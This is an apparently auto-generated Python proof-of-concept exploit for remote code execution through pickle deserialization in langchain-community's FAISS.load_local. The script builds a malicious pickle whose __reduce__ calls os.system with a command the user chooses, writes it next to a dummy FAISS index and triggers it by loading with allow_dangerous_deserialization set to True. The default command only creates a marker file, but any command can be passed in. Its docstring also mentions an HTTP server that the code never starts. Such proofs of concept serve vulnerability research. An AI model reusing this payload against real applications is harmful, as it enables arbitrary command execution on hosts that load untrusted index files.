#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-014
# Sink: load_local
# Auto-generated — run with: python3 rce_if_caller_sets_allow_load_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community's FAISS.load_local().

Vulnerability: The function loads a pickle file from a path constructed from
user-controlled `folder_path` and `index_name`. If `allow_dangerous_deserialization`
is set to True (as it might be in production apps that load user-uploaded files),
an attacker can provide a path to a malicious pickle file, achieving arbitrary
code execution via pickle deserialization.

This PoC:
1. Creates a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosts it on a local HTTP server (or uses a local file path)
3. Simulates calling load_local with attacker-controlled folder_path pointing to the malicious file

Usage:
    python3 poc.py [--target-path PATH] [--payload-command CMD]

    --target-path: Path where the malicious pickle will be placed (default: /tmp/exploit)
    --payload-command: Command to execute (default: touch /tmp/poc_success.txt)
"""

import os
import sys
import pickle
import argparse
import tempfile
import subprocess
from pathlib import Path

# Import the vulnerable function
from langchain_community.vectorstores.faiss import FAISS


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a pickle payload that executes a system command when unpickled.
    
    This uses the classic __reduce__ method to execute arbitrary code.
    """
    class MaliciousPickle(object):
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPickle())


def setup_exploit_environment(target_path: str, payload_command: str) -> str:
    """
    Set up the exploit by creating the malicious pickle file.
    
    Returns the folder_path that should be passed to load_local.
    """
    # Create the target directory
    target_dir = Path(target_path)
    target_dir.mkdir(parents=True, exist_ok=True)
    
    # Create the malicious pickle file (must be named {index_name}.pkl)
    # We'll use index_name "exploit" so the file is exploit.pkl
    index_name = "exploit"
    pickle_path = target_dir / f"{index_name}.pkl"
    
    # Also need a dummy .faiss file (load_local tries to load it first)
    # We'll create a minimal valid FAISS index file
    try:
        import faiss
        import numpy as np
        # Create a tiny FAISS index
        dim = 64
        index = faiss.IndexFlatL2(dim)
        faiss.write_index(index, str(target_dir / f"{index_name}.faiss"))
    except ImportError:
        # If faiss is not installed, create a dummy file that will fail gracefully
        # The exploit still works because the pickle is loaded after the FAISS index
        with open(target_dir / f"{index_name}.faiss", "wb") as f:
            f.write(b"dummy")
    
    # Write the malicious pickle
    malicious_pickle = create_malicious_pickle(payload_command)
    with open(pickle_path, "wb") as f:
        f.write(malicious_pickle)
    
    print(f"[+] Created malicious pickle at: {pickle_path}")
    print(f"[+] Payload command: {payload_command}")
    
    return str(target_dir), index_name


def trigger_exploit(folder_path: str, index_name: str):
    """
    Trigger the vulnerability by calling load_local with attacker-controlled parameters.
    
    Note: This requires allow_dangerous_deserialization=True, which is the
    vulnerable configuration.
    """
    print(f"[*] Attempting to trigger RCE via load_local...")
    print(f"[*] folder_path: {folder_path}")
    print(f"[*] index_name: {index_name}")
    
    try:
        # We need embeddings for the call, but the exploit happens during pickle.load
        # before embeddings are used. We'll pass None and catch the error.
        result = FAISS.load_local(
            folder_path=folder_path,
            embeddings=None,
            index_name=index_name,
            allow_dangerous_deserialization=True
        )
        print(f"[!] Unexpected: load_local returned successfully: {result}")
    except Exception as e:
        # The exploit should have already executed by now (during pickle.load)
        # The exception is likely from the FAISS index loading or missing embeddings
        print(f"[*] Exception caught (expected): {type(e).__name__}: {e}")
        print(f"[*] Note: The pickle payload should have executed before this exception.")


def verify_exploit_success(check_file: str = "/tmp/poc_success.txt"):
    """Check if the payload command was executed."""
    if os.path.exists(check_file):
        print(f"[+] SUCCESS: Payload executed! File {check_file} exists.")
        return True
    else:
        print(f"[-] Payload may not have executed. File {check_file} not found.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community FAISS.load_local()"
    )
    parser.add_argument(
        "--target-path",
        default="/tmp/exploit",
        help="Directory to place malicious pickle files (default: /tmp/exploit)"
    )
    parser.add_argument(
        "--payload-command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute via pickle deserialization (default: touch /tmp/poc_success.txt)"
    )
    args = parser.parse_args()
    
    print("=" * 60)
    print("LangChain-Community FAISS.load_local() RCE PoC")
    print("=" * 60)
    print()
    
    # Step 1: Set up the exploit environment
    print("[*] Step 1: Creating malicious pickle file...")
    folder_path, index_name = setup_exploit_environment(
        args.target_path, args.payload_command
    )
    print()
    
    # Step 2: Trigger the vulnerability
    print("[*] Step 2: Triggering the vulnerability...")
    trigger_exploit(folder_path, index_name)
    print()
    
    # Step 3: Verify
    print("[*] Step 3: Verifying exploit success...")
    verify_exploit_success()
    print()
    
    # Cleanup (optional)
    print("[*] Cleanup: Removing exploit files...")
    import shutil
    shutil.rmtree(args.target_path, ignore_errors=True)
    print(f"[*] Removed {args.target_path}")
    
    print()
    print("=" * 60)
    print("PoC completed.")
    print("=" * 60)


if __name__ == "__main__":
    main()
